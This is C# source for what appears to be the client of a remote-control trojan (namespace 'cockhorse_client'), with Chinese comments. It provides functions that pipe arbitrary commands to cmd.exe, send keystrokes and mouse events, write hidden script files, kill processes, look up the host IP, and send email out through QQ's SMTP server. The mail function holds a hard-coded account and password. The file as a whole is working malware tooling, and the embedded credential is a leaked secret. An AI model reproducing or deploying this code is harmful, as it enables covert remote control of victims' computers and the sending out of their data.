using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace cockhorse_client
{
    /// <summary>
    /// 用于控制客户端实现功能
    /// </summary>
    static class Func
    {
        /// <summary>
        /// 接收指令
        /// </summary>
        private static string designator;
        /// <summary>
        /// 获取当前用户名
        /// </summary>
        public static string username = Environment.UserName;
        /// <summary>
        /// 获取桌面路径
        /// </summary>
        public static string desktop_path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);



        /// <summary>
        /// 初始化函数，用于获取和验证指令
        /// </summary>
        /// <param name="instruct"></param>
        /// <returns></returns>
        public static bool init(string instruct)
        {
            if (instruct.Length != 4)
                return false;

            foreach(char c in instruct)
            {
                if(!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= 48 && c <= 57)))
                {
                    return false;
                }
            }
            designator = instruct;
            return true;
        }
        /// <summary>
        /// 获取ip
        /// </summary>
        /// <returns>ip</returns>
        public static string getIp()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily .InterNetwork,SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 1337);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return endPoint.Address.ToString();
                }
            }
            catch (Exception)
            {

            }
            return "";
        }


        /// <summary>
        /// cmd指令
        /// </summary>
        /// <param name="cmd_str"></param>
        public static void shutdown(string cmd_str)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";//进程打开的文件为Cmd
            p.StartInfo.UseShellExecute = false;//是否启动系统外壳选否
            p.StartInfo.RedirectStandardInput = true;//这是是否从StandardInput输入
            p.StartInfo.CreateNoWindow = false;//这里是启动程序是否显示窗体
            p.Start();//启动
            p.StandardInput.WriteLine(cmd_str);
            p.StandardInput.WriteLine("exit");
        }
        public static void shutdown(FileStream bat_file)
        {
            FileStream f = bat_file;
            StreamReader sr = new StreamReader(f);
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";//进程打开的文件为Cmd
            p.StartInfo.UseShellExecute = false;//是否启动系统外壳选否
            p.StartInfo.RedirectStandardInput = true;//这是是否从StandardInput输入
            p.StartInfo.CreateNoWindow = false;//这里是启动程序是否显示窗体
            p.Start();//启动
            p.StandardInput.WriteLine(sr.ReadLine());
            p.StandardInput.WriteLine("exit");
        }

        /// <summary>
        /// 自动按键
        /// (SHIFT+)(CTRL^)(ALT%)（{ENTER}或~）({Fn})  
        /// </summary>
        /// <param name="key">按键</param>
        /// <param name="time">间隔时间</param>
        /// <param name="count">循环次数，为0无限循环</param>
        public static void aiKey(string key, int time, int count)
        {
            if(count == 0)
            {
                while (true)
                {
                    Thread.Sleep(time);
                    SendKeys.SendWait(key);
                }
            }
            else if(count > 0)
            {
                for(int i = 0; i < count; i++)
                {
                    Thread.Sleep(time);
                    SendKeys.SendWait(key);
                }
            }
            else
            {
                return;
            }  
        }

        /// <summary>
        /// 打开目录或文件，目录中不要有空格
        /// </summary>
        /// <param name="path">路径</param>
        public static void startFile(string path)
        {
            if (File.Exists(path))
            {
                System.Diagnostics.Process.Start(path);
            }
            if (Directory.Exists(path))
            {
                System.Diagnostics.Process.Start("explorer.exe", path);
            }
        }

        /// <summary>
        /// 创建脚本文件
        /// </summary>
        /// <param name="script_code">脚本代码</param>
        /// <param name="path">目标目录</param>
        public static void createScript(string script_code, string path)
        {
            FileStream fs = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
            System.IO.File.SetAttributes(path, FileAttributes.Hidden);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(script_code);
            sw.Close();
            fs.Close();
        }

        /// <summary>
        /// 设置鼠标位置
        /// </summary>
        /// <param name="dwFlags">取下面const值，多选用或</param>
        /// <param name="x"></param>
        /// <param name="y"></param>
        /// <param name="cButtons">0</param>
        /// <param name="dwExtraInfo">0</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        public static extern int mouse_event(int dwFlags, int x, int y, int cButtons = 0, int dwExtraInfo = 0);
        public struct MouseEvent{
            //移动
            public const int MOUSEEVENTE_MOVE = 0x0001;
            //左键按下
            public const int MOUSEEVENTE_LEFTDOWN = 0x0002;
            //左键抬起
            public const int MOUSEEVENTE_LEFTUP = 0x0004;
            //右键按下
            public const int MOUSEEVENTE_RIGHTDOWN = 0x0008;
            //右键抬起
            public const int MOUSEEVENTE_RIGHTUP = 0x0010;
            //中键按下
            public const int MOUSEEVENTE_MIDDLEDOWN = 0x0020;
            //中键抬起
            public const int MOUSEEVENTE_MIDDLEUP = 0x0040;
            //是否绝对定位
            public const int MOUSEEVENTE_ABSOLUTE = 0x8000;
        };
        

        /// <summary>
        /// 发送邮箱
        /// </summary>
        /// <param name="title">标题</param>
        /// <param name="message">内容</param>
        /// <param name="email">目标邮箱</param>
        public static void sendEmail(string title, string message, string email)
        {
            MailMessage mail = new MailMessage();
            SmtpClient smtp = new SmtpClient();

            mail.From = new MailAddress("2357054981@qq.com");
            mail.To.Add(new MailAddress(email));
            mail.IsBodyHtml = true;
            mail.SubjectEncoding = System.Text.Encoding.UTF8;
            mail.Subject = title;
            mail.BodyEncoding = System.Text.Encoding.UTF8;
            mail.Priority = MailPriority.Normal;
            mail.Body = message;

            smtp.Host = "smtp.qq.com";
            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtp.Timeout = 1000000;

            smtp.EnableSsl = true;
            smtp.Port = 25;
            smtp.UseDefaultCredentials = true;
            smtp.Credentials = new System.Net.NetworkCredential("2357054981@qq.com", "cwsnbinzwoltdjga");
            try
            {
                smtp.Send(mail);
            }
            catch (Exception)
            {

            }
        }

        public static void killProc(string str_pro_name)
        {
            try
            {
                foreach(Process p in Process.GetProcesses())
                {
                    if(p.ProcessName.IndexOf(str_pro_name) >= 0)
                    {
                        if (!p.CloseMainWindow())
                        {
                            p.Kill();
                        }
                    }
                }
            }
            catch (Exception)
            {

            }
        }



    }
}
